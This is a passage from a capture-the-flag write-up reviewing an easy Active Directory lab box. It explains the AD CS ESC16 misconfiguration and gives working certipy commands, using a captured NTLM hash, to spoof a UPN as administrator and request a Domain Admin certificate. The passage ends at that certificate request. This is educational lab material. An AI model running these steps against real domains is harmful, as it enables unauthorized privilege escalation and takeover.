## Review

A classic Active Directory easy box that walks you through a full chain: NTLM hash capture, shadow credentials, and an AD CS ESC16 abuse to get Domain Admin. Nothing here is particularly hard on its own, but the clock skew and the ESC16 UPN handling can waste a lot of your time if you don't know what's going on.
The user flag is a straightforward shadow credentials attack once you sort the clock skew, while root requires understanding how ESC16 and the SID Security Extension work together.

**Personal Rating:** ⭐⭐⭐⭐ (4/5)

**Recommended for:** Beginners looking to practice AD CS abuse, shadow credentials, and BloodHound-driven privilege escalation.

ESC16 found.

So ESC16 is basically an AD CS misconfiguration that lives at the CA level, not on a specific template. Normally when a Windows CA issues a certificate, it stamps a special extension into it called the SID Security Extension (OID `1.3.6.1.4.1.311.25.2`). Think of it as the CA writing down "hey, this cert really belongs to THIS specific account SID" so nobody can fake being someone else.

ESC16 happens when the admin disables that extension on the whole CA. You can spot it in the certipy output right here:

```
Disabled Extensions : 1.3.6.1.4.1.311.25.2
```

Once that security stamp is gone, the CA stops binding certs to a SID and just trusts whatever identity info is in the request. That opens the door to UPN spoofing: if we control an account that can enroll (here it's `ca_svc`, which sits in Cert Publishers), we just change that account's `userPrincipalName` to `administrator`, request a normal cert with the User template, and the CA happily hands us a certificate that authenticates as the domain admin. No SID check to stop us.

The attack chain looks like this:
1. Swap that account's UPN to `administrator`
2. Request a cert using a template we can enroll in

```bash
#Update the UPN to administrator
certipy account -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip $target -user ca_svc -upn administrator update

#Result
[*] Updating user 'ca_svc':  
   userPrincipalName                   : administrator  
[*] Successfully updated 'ca_svc'

#Request a certificate using the administrator UPN
faketime "$(sudo ntpdate -q dc01.fluffy.htb | head -1 | awk '{print $1" "$2}')" \  
 certipy req -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 \  
 -dc-ip $target -dc-host dc01.fluffy.htb \  
 -ca fluffy-DC01-CA -template User \  
 -timeout 30 -debug
```
